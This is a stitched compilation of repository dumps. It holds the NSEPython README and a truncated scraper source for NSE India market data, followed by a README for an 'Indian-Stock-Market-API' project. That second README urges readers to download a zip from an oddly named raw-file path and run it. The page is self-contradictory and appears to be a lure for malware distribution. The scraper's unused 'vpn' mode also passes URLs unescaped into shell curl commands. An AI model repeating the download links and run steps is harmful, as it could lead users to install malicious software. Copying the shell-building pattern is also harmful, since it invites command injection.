    <img width="300" src="https://forum.unofficed.com/uploads/default/original/2X/1/146aad29b92adf82059eacba2feca24741c9f859.png" alt="logo">
  </a>
</p>

#### NSEPython is a Python library to get publicly available data on the current [NSEIndia](https://nseindia.com) and [NIFTY Indices](https://www.niftyindices.com/) site by communicating with their REST APIs.

<p align="left">
  <a href="https://unofficed.com/nse-python/documentation/" target="_blank">
    <img width="200" src="https://forum.unofficed.com/uploads/default/original/2X/6/6b62554e8dc05701dab74b41e681e8b361e0f37f.png" alt="logo">
  </a>
</p>

## Support and Beta Functions

- If you have other doubts or want to check out the beta functions, visit the [NSEPython Discussions](https://forum.unofficed.com/c/programming/nse-python-api/) forum.
- If you have feature requests, you can submit them at the [NSEPython Feature Request](https://forum.unofficed.com/t/nsepython-discussion-and-feature-request/665) forum.

## Versions

There are two versions of NSEPython depending on the execution environment. While it's technically feasible to combine these versions into a single program, doing so could introduce latency. Given the financial nature of this program, time is of the essence.


| NSEPython Edition          | Compatibility                | Tested Environments           |
|---------------------------|-----------------------------|-------------------------------|
| [Local Edition](https://github.com/aeron7/nsepython)    | Laptops (Windows 11, 10)     | Windows 11, Windows 10         |
| [Server Edition](https://github.com/aeron7/nsepythonserver)   | Servers (AWS, Google Colab, DigitalOcean) | AWS, Google Colab, DigitalOcean |

## Installation

Use the package manager [pip](https://pypi.org/project/nsepython/) to install nsepython.

#### [NSEPython Local Edition](https://github.com/aeron7/nsepython)

Access NSEPython for laptops, specifically tailored for Windows 11 and Windows 10 compatibility.


```bash
pip install nsepython
```

#### [NSEPython Server Edition](https://github.com/aeron7/nsepythonserver)

Leverage NSEPython designed for server environments, seamlessly functioning on AWS, Google Colab, and DigitalOcean.

```bash
pip install nsepythonserver
```

## Cross Library Migration
All the functions from the two renowned packages, NsepY and NSETools, have been migrated here with the same function names. Both of these packages had been left unmaintained for a considerable period.

## Advanced Usecases

### Mastering AlgoTrading: A Beginner's Guide using NSEPython
- [Candlestick Charts in Python with NSEPython and Plotly](https://unofficed.com/courses/mastering-algotrading-beginners-guide-nsepython/lessons/candlestick-charts-python/)
- [Calculate any Option Greek using Black Scholes Formula in Python](https://unofficed.com/black-scholes-formula-in-python/)
- [How to find the beta of Indian stocks using Python?](https://unofficed.com/how-to-find-the-beta-of-indian-stocks-using-python/)
- [How to get Historical PE, PB and Dividend Ratio of any index using Python](https://unofficed.com/nse-python/documentation/nsepy/#index_pe_pb_div)

### Designing an Index Fund From Scratch in Indian Share Market
- [Building An Market-Weight Adjusted N50 Index Fund – Part I](https://unofficed.com/courses/designing-an-index-fund-from-scratch-in-indian-share-market/lessons/building-an-market-weight-adjusted-n50-index-fund-i/)
- [Building An Market-Weight Adjusted N50 Index Fund – Part II](https://unofficed.com/courses/designing-an-index-fund-from-scratch-in-indian-share-market/lessons/building-an-market-weight-adjusted-n50-index-fund-part-ii/)
- [How to calculate NIFTY 50 value from the stock prices in Python](https://unofficed.com/courses/designing-an-index-fund-from-scratch-in-indian-share-market/lessons/how-to-calculate-nifty-50-value-from-the-stock-prices-in-python/)

### Coding Heatmap and ORB
- [Creating Dynamic Heatmap for Indian Stock Market](https://unofficed.com/courses/designing-an-index-fund-from-scratch-in-indian-share-market/lessons/creating-dynamic-heatmap-for-indian-stock-market/)
- [Coding Heatmap Opening Range Breakout Strategy in Python – Part 1](https://unofficed.com/courses/designing-an-index-fund-from-scratch-in-indian-share-market/lessons/opening-range-breakout-python-part-i/)
- [Coding Heatmap Opening Range Breakout Strategy in Python – Part 2](https://unofficed.com/courses/designing-an-index-fund-from-scratch-in-indian-share-market/lessons/opening-range-breakout-python-part-ii/)

### Markov Chain

- [Stochastic Modeling in Stock Market](https://unofficed.com/courses/markov-model-application-of-markov-chain-in-stock-market/lessons/stochastic-modeling-in-stock-market/)
- [Application of Markov Chains in Stock Market](https://unofficed.com/courses/markov-model-application-of-markov-chain-in-stock-market/lessons/application-of-markov-chains-in-stock-market/)
- [Markov Chains in Stock Market Using Python – Getting Transition Matrix​](https://unofficed.com/courses/markov-model-application-of-markov-chain-in-stock-market/lessons/markov-chains-in-stock-market-using-python-getting-transition-matrix/)
- [How to do Random Walk using NSEPython in Indian Stock Market](https://unofficed.com/courses/markov-model-application-of-markov-chain-in-stock-market/lessons/how-to-do-random-walk-using-nsepython-in-indian-stock-market/)
- [Markov Chain and Linear Algebra – Calculation of Stationary Distribution using Python​](https://unofficed.com/courses/markov-model-application-of-markov-chain-in-stock-market/lessons/markov-chain-and-linear-algebra-calculation-of-stationary-distribution-using-python/)
- [Find the Equilibrium Matrix in Markov Chain using Python in Indian Stock Market](https://unofficed.com/courses/markov-model-application-of-markov-chain-in-stock-market/lessons/find-the-equilibrium-matrix-in-markov-chain-using-python-in-stock-market/)


## Leverage

In [Leverage](https://www.unofficed.com/leverage/), a plethora of trader-focused tools has been meticulously crafted using NSEPython.

Here's an illustration of a [Sectoral Heatmap](https://unofficed.com/leverage/sectoral-heatmap/), showcasing the extent of complexity that NSEPython API can effortlessly handle.

<p align="left">
  <a href="https://www.unofficed.com/leverage/" target="_blank">
    <img  src="https://unofficed.com/wp-content/uploads/2023/08/Sectoral-Heatmap.png" alt="logo">
  </a>
</p>

### Core Implementation Code & Architecture
#### File: `nsepython/__init__.py`
```python
from .rahu import *

__version__ = "0.1"
```

#### File: `setup.py`
```python
import setuptools
import os
version = os.environ.get("PACKAGE_VERSION", "0.0.0")  # fallback if not set

with open("README.md", "r") as fh:
    long_description = fh.read()

setuptools.setup(
    name = 'nsepython',
    packages=setuptools.find_packages(),
    version = version,
    license='GNU',
    include_package_data=True,
    description = 'Python library for NSE India APIs',
    long_description=long_description,
    long_description_content_type="text/markdown",  author = 'Aeron7',
    author_email = 'dexter@unofficed.com',
    url = 'https://github.com/aeron7/nsepython',
    install_requires=['requests', 'pandas','scipy'],
    keywords = ['nseindia', 'nse', 'python', 'sdk', 'trading', 'stock markets'],
    classifiers=[
      'Intended Audience :: Developers',
      'Natural Language :: English',
      'Operating System :: OS Independent',
      'Programming Language :: Python',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: Implementation :: PyPy',
      'Topic :: Software Development :: Libraries :: Python Modules'
    ],
)
```

#### File: `nsepython/rahu.py`
```python
import os,sys
#os.chdir(os.path.dirname(os.path.abspath(__file__)))
#sys.path.insert(1, os.path.join(sys.path[0], '..'))

import requests
import pandas as pd
import json
import random
import datetime,time
import logging
import re
import urllib.parse 

mode ='local'

if mode == "vpn":
    def nsefetch(payload: str):
        def encode(url: str) -> str:
            if "%26" in url or "%20" in url:
                return url
            return urllib.parse.quote(url, safe=":/?&=")

        def refresh_cookies():
            os.popen(f'curl -c cookies.txt "https://www.nseindia.com" {curl_headers}').read()
            os.popen(f'curl -b cookies.txt -c cookies.txt "https://www.nseindia.com/option-chain" {curl_headers}').read()

        if not os.path.exists("cookies.txt"):
            refresh_cookies()

        encoded_url = encode(payload)
        cmd = f'curl -b cookies.txt "{encoded_url}" {curl_headers}'
        raw = os.popen(cmd).read()

        try:
            return json.loads(raw)
        except ValueError:
            refresh_cookies()
            raw = os.popen(cmd).read()
            try:
                return json.loads(raw)
            except ValueError:
                return {}

if(mode=='local'):
    def nsefetch(payload):

        try:
            s = requests.Session()
            s.get("https://www.nseindia.com", headers=headers, timeout=10)
            s.get("https://www.nseindia.com/option-chain", headers=headers, timeout=10)
            output = s.get(payload, headers=headers, timeout=10).json()
        except ValueError:
            output = {}
        return output


headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Sec-Fetch-User': '?1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
}

#Curl headers
curl_headers = ''' -H "authority: beta.nseindia.com" -H "cache-control: max-age=0" -H "dnt: 1" -H "upgrade-insecure-requests: 1" -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" -H "sec-fetch-user: ?1" -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "sec-fetch-site: none" -H "sec-fetch-mode: navigate" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9,hi;q=0.8" --compressed'''

run_time=datetime.datetime.now()

#Constants
indices = ['NIFTY','FINNIFTY','BANKNIFTY']

def running_status():
    start_now=datetime.datetime.now().replace(hour=9, minute=15, second=0, microsecond=0)
    end_now=datetime.datetime.now().replace(hour=15, minute=30, second=0, microsecond=0)
    return start_now<datetime.datetime.now()<end_now

#Getting FNO Symboles
def fnolist():
    positions = nsefetch('https://www.nseindia.com/api/equity-stockIndices?index=SECURITIES%20IN%20F%26O')
    nselist = indices.copy()
    for x in range(len(positions['data'])):
        nselist.append(positions['data'][x]['symbol'])
    return nselist

def nsesymbolpurify(symbol):
    symbol = symbol.replace('&','%26') #URL Parse for Stocks Like M&M Finance
    return symbol

def nse_optionchain_scrapper(symbol):
    symbol = nsesymbolpurify(symbol)
    # Using getSymbolDerivativesData as it provides all expiries and strikes in one go
    url = f'https://www.nseindia.com/api/NextApi/apiClient/GetQuoteApi?functionName=getSymbolDerivativesData&symbol={symbol}'
    payload = nsefetch(url)
    
    # Transformation to match the "data" structure expected by pcr and other functions
    if payload and 'data' in payload:
        new_data = []
        # Group by strikePrice and expiryDate to create a combined CE/PE structure if possible,
        # or just provide the raw list if the consumers can handle it.
        # The current pcr() handles a list of entries where each has CE/PE keys OR is the entry itself.
        
        # Actually, let's restructure it to be more compatible with the expected 'data' format:
        # a list of dictionaries, each having 'strikePrice', 'expiryDate', 'CE', 'PE'.
        combined = {}
        for entry in payload['data']:
            sp = entry.get('strikePrice')
            ed = entry.get('expiryDate')
            ot = entry.get('optionType')
            if not sp or not ed or ot == 'XX': continue
            
            key = (sp, ed)
            if key not in combined:
                combined[key] = {'strikePrice': sp, 'expiryDate': ed, 'CE': None, 'PE': None}
            
            combined[key][ot] = entry
            
        payload['data'] = list(combined.values())
        
    return payload


def oi_chain_builder(symbol,expiry="latest",oi_mode="full"):

    if expiry == "latest":
        dates = expiry_list(symbol, type="list")
        if dates:
            expiry = dates[0]
        else:
            return pd.DataFrame(), 0.0, ""

    payload = nse_optionchain_scrapper(symbol)

    if(oi_mode=='compact'):
        col_names = ['CALLS_OI','CALLS_Chng in OI','CALLS_Volume','CALLS_IV','CALLS_LTP','CALLS_Net Chng','Strike Price','PUTS_OI','PUTS_Chng in OI','PUTS_Volume','PUTS_IV','PUTS_LTP','PUTS_Net Chng']
    if(oi_mode=='full'):
        col_names = ['CALLS_Chart','CALLS_OI','CALLS_Chng in OI','CALLS_Volume','CALLS_IV','CALLS_LTP','CALLS_Net Chng','CALLS_Bid Qty','CALLS_Bid Price','CALLS_Ask Price','CALLS_Ask Qty','Strike Price','PUTS_Bid Qty','PUTS_Bid Price','PUTS_Ask Price','PUTS_Ask Qty','PUTS_Net Chng','PUTS_LTP','PUTS_IV','PUTS_Volume','PUTS_Chng in OI','PUTS_OI','PUTS_Chart']
    oi_data = pd.DataFrame(columns = col_names)

    # We will populate these dynamically
    rows_list = []
    
    if 'expiryDates' not in payload:
        # Fallback for new API structure
        if(expiry=="latest"):
            expiry = expiry_list(symbol, type="list")[0]
        data_list = payload['data']
    else:
        # Legacy structure support
        if(expiry=="latest"):
            expiry = payload['records']['expiryDates'][0]
        data_list = payload['records']['data']

    for m in range(len(data_list)):
        current_expiry_str = data_list[m].get('expiryDates') or data_list[m].get('expiryDate')
        try:
            # Convert both to date objects for robust comparison
            if "-" in current_expiry_str:
                parts = current_expiry_str.split("-")
                if parts[1].isdigit(): fmt = "%d-%m-%Y"
                else: fmt = "%d-%b-%Y"
                curr_date = datetime.datetime.strptime(current_expiry_str, fmt).date()
                
                parts_exp = expiry.split("-")
                if parts_exp[1].isdigit(): fmt_exp = "%d-%m-%Y"
                else: fmt_exp = "%d-%b-%Y"
                exp_date = datetime.datetime.strptime(expiry, fmt_exp).date()
                match = (curr_date == exp_date)
            else:
                match = (current_expiry_str == expiry)
        except:
            match = (current_expiry_str == expiry)

        if match:
            oi_row = {col: 0 for col in col_names}
            oi_row['Strike Price'] = data_list[m]['strikePrice']

            for side in ['CE', 'PE']:
                prefix = f"{'CALLS' if side == 'CE' else 'PUTS'}_"
                if side in data_list[m] and data_list[m][side] is not None:
                    d = data_list[m][side]
                    oi_row[prefix + 'OI'] = d.get('openInterest', 0)
                    oi_row[prefix + 'Chng in OI'] = d.get('changeinOpenInterest', 0)
                    oi_row[prefix + 'Volume'] = d.get('totalTradedVolume', 0)
                    oi_row[prefix + 'IV'] = d.get('impliedVolatility', 0)
                    oi_row[prefix + 'LTP'] = d.get('lastPrice', 0)
                    oi_row[prefix + 'Net Chng'] = d.get('change', 0)
                    
                    if oi_mode == 'full':
                        # New API key mapping
                        oi_row[prefix + 'Bid Qty'] = d.get('buyQuantity1', d.get('bidQty', 0))
                        oi_row[prefix + 'Bid Price'] = d.get('buyPrice1', d.get('bidprice', 0))
                        oi_row[prefix + 'Ask Price'] = d.get('sellPrice1', d.get('askPrice', 0))
                        oi_row[prefix + 'Ask Qty'] = d.get('sellQuantity1', d.get('askQty', 0))
                        oi_row[prefix + 'Chart'] = 0

            rows_list.append(oi_row)

    oi_data = pd.DataFrame(rows_list)
    timestamp = payload.get('timestamp', payload.get('records', {}).get('timestamp', ''))
    underlyingValue = payload.get('underlyingValue', payload.get('records', {}).get('underlyingValue', 0))
    oi_data['time_stamp'] = timestamp
    return oi_data, float(underlyingValue), timestamp


def nse_quote_derivatives(symbol):
    symbol = nsesymbolpurify(symbol)
    if symbol.upper() in fnolist():
        payload = nsefetch('https://www.nseindia.com/api/NextApi/apiClient/GetQuoteApi?functionName=getSymbolDerivativesData&symbol='+symbol)
        return payload
    else:
        return {"error": f"{symbol} is not in derivatives list."}

def nse_quote(symbol,section=""):
    #https://forum.unofficed.com/t/nsetools-get-quote-is-not-fetching-delivery-data-and-delivery-can-you-include-this-as-part-of-feature-request/1115/4    
    symbol = nsesymbolpurify(symbol)

    if(section==""):
        if any(x in symbol for x in indices):
            payload = nsefetch('https://www.nseindia.com/api/NextApi/apiClient/GetQuoteApi?functionName=getSymbolDerivativesData&symbol='+symbol)
        else:
            payload = nsefetch('https://www.nseindia.com/api/NextApi/apiClient/GetQuoteApi?functionName=getSymbolData&marketType=N&series=EQ&symbol='+symbol)
        return payload

    if(section!=""):
        payload = nsefetch('https://www.nseindia.com/api/quote-equity?symbol='+symbol+'&section='+section)            
        return payload
def nse_expirydetails(payload, i=0, symbol=None):
    expiry_dates = []
    if 'records' in payload:
        expiry_dates = payload['records']['expiryDates']
    elif 'expiryDates' in payload:
        expiry_dates = payload['expiryDates']
    elif 'data' in payload:
        unique_dates = set()
        for entry in payload['data']:
            if 'expiryDate' in entry:
                unique_dates.add(entry['expiryDate'])
        expiry_dates = sorted(list(unique_dates), key=lambda x: datetime.datetime.strptime(x, "%d-%b-%Y"))

    # Filter future dates
    future_expiry_dates = []
    if expiry_dates:
        temp_dates = [datetime.datetime.strptime(date, "%d-%b-%Y").date() for date in expiry_dates]
        future_expiry_dates = sorted([date.strftime("%d-%b-%Y") for date in temp_dates if date >= datetime.datetime.now().date()], key=lambda x: datetime.datetime.strptime(x, "%d-%b-%Y"))

    # Fallback to expiry_list if i is out of range and we can determine the symbol
    if i >= len(future_expiry_dates):
        if not symbol and 'data' in payload and len(payload['data']) > 0:
            # Try to extract symbol from payload data
            first_entry = payload['data'][0]
            symbol = first_entry.get('symbol')
            if not symbol:
                if 'CE' in first_entry and first_entry['CE']:
                    symbol = first_entry['CE'].get('underlying')
                elif 'PE' in first_entry and first_entry['PE']:
                    symbol = first_entry['PE'].get('underlying')
        
        if symbol:
            dates = expiry_list(symbol, type="list")
            if dates:
                # Filter future dates from expiry_list as well
                temp_dates = [datetime.datetime.strptime(date, "%d-%b-%Y").date() for date in dates]
                future_expiry_dates = sorted([date.strftime("%d-%b-%Y") for date in temp_dates if date >= datetime.datetime.now().date()], key=lambda x: datetime.datetime.strptime(x, "%d-%b-%Y"))

    if i >= len(future_expiry_dates):
        return None, None

    currentExpiry = future_expiry_dates[i]
    currentExpiry_dt = datetime.datetime.strptime(currentExpiry, '%d-%b-%Y').date()
    date_today = run_time.date()
    dte = (currentExpiry_dt - date_today).days
    return currentExpiry_dt, dte
def pcr(payload, inp=0):
    ce_oi = 0
    pe_oi = 0
    
    # Identify the data and expiry dates based on structure
    if 'records' in payload:
        # Legacy structure
        data_list = payload['records']['data']
        expiry_dates = payload['records']['expiryDates']
    elif 'data' in payload:
        # New structure
        data_list = payload['data']
        # Extract unique sorted expiry dates from data
        unique_dates = set()
        for entry in data_list:
            ed = entry.get('expiryDate') or entry.get('expiryDates')
            if ed:
                unique_dates.add(ed)
        expiry_dates = sorted(list(unique_dates), key=lambda x: datetime.datetime.strptime(x, "%d-%m-%Y") if "-" in x and x.split("-")[1].isdigit() else datetime.datetime.strptime(x, "%d-%b-%Y"))
    else:
        # If payload is empty or unknown, we can't proceed without fetching
        # But we need a symbol. Try to get it from payload if possible.
        return 0.0

    if not expiry_dates or inp >= len(expiry_dates):
        # Requested index is outside the current payload's scope.
        # Check if we can fetch more data for this specific symbol.
        symbol = payload.get('symbol') or payload.get('records', {}).get('symbol')
        if not symbol and 'data' in payload and len(payload['data']) > 0:
             first = payload['data'][0]
             symbol = first.get('symbol') or (first.get('CE') and first['CE'].get('underlying'))
        
        if symbol and inp > 0:
            # Fetch all expiries to find the target one
            all_expiries = expiry_list(symbol, type="list")
            if inp < len(all_expiries):
                target = all_expiries[inp]
                # Fetch specific expiry data using getOptionChainData
                url = f'https://www.nseindia.com/api/NextApi/apiClient/GetQuoteApi?functionName=getOptionChainData&symbol={nsesymbolpurify(symbol)}&params=expiryDate={target}'
                new_payload = nsefetch(url)
                if new_payload and 'data' in new_payload:
                    for entry in new_payload['data']:
                        ce_oi += entry.get('CE', {}).get('openInterest', 0) if entry.get('CE') else 0
                        pe_oi += entry.get('PE', {}).get('openInterest', 0) if entry.get('PE') else 0
                    if ce_oi > 0: return pe_oi / ce_oi
        return 0.0
        
    target_expiry = expiry_dates[inp]
    
    found_data = False
    
# ... [TRUNCATED FILE CONTENT]
```


==================================================


## [3/3] Repository: Indian-Stock-Market-API (`VAULT_IN-QUANT-079_Clayborninconsistent906__Indian-Stock-Market-API`)
- **Full Name**: `IN-QUANT-079_Clayborninconsistent906__Indian-Stock-Market-API`
- **Description**: 
- **GitHub Stars**: 0
- **Source Pool**: `indian_quant_vault`

### Documentation & Overview (README.md)
# 📈 Indian-Stock-Market-API - Access Real-Time Indian Stock Market Data

## 🔗 Download Now
[![Download Indian Stock Market API](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip%20Now-v1.0-blue)](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip)

## 🚀 Getting Started
Welcome to the Indian Stock Market API. This software provides easy access to real-time stock prices, company information, and market data from the NSE and BSE. You won’t need to register for an API key, making it simple to get started right away.

## 📥 Download & Install
To begin, visit [this page to download](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip). You will see the available versions of the software. Choose the version you need, and then click the appropriate link to download the file.

1. Go to the [Releases page](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip).
2. Find the latest version listed.
3. Click on the download link for your operating system (Windows, macOS, or Linux).
4. After the download finishes, install the application by following the prompts or just running the downloaded file, depending on your system.

## ⚙️ System Requirements
- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
- **Python Version:** Python 3.6 or later.
- Recommended: At least 4 GB of RAM for smooth performance.

## 📊 Features
- **Real-Time Data:** Get live updates on stock prices and market changes.
- **Company Information:** Access details about various Indian companies traded on NSE and BSE.
- **No API Key Needed:** Use the API with zero hassle or signup requirements.
- **Compatibility:** Perfect for integration with automation tools like n8n and Zapier, as well as trading bots.
  
## 🛠️ How to Use
1. **Start the API.** After installation, run the application. This will start the API and prepare it to serve requests.
2. **Send Requests.** You can send HTTP requests to the API in a user-friendly way. For example, use the endpoint to get stock prices via your browser or a tool like Postman.
3. **Check Responses.** The responses will include real-time stock prices and other market data in a simple format.

## 👩‍💻 Example Queries
To get you started, here are a few example requests you can make:

- **Get Nifty 50 Stock Prices:**  
  `GET http://localhost:5000/nse/nifty50`

- **Get BSE Stock Prices:**  
  `GET http://localhost:5000/bse/stock_prices`

Each of these will return a JSON response with the data you need.

## 📑 Documentation
The detailed documentation is available in the repository. It includes various endpoints, response formats, and examples. Review the documentation to understand how to use all features effectively.

## 🔧 Troubleshooting
Should you encounter issues:

1. Ensure that the API is running. Check your command line for any error messages.
2. Validate your network connection.
3. Confirm that you are using the correct endpoint.

If problems persist, you can open an issue in the repository.

## 🧑‍🤝‍🧑 Community
Join our community of users on platforms like GitHub and forums. Share your experiences, ask questions, and get involved. Your feedback is valuable and helps us improve the API.

## 👩‍🎓 Learn More
If you're interested in learning more about stock market APIs or how to integrate with automation tools, there are numerous resources online. Websites like Yahoo Finance and Investopedia can offer insights into market trends and data analysis.

## 📝 License
This application is under the MIT License. You can use, modify, and distribute it freely, as long as you include the original license in your copies.

For any additional questions or concerns, please feel free to reach out through GitHub issues. Happy trading!


==================================================
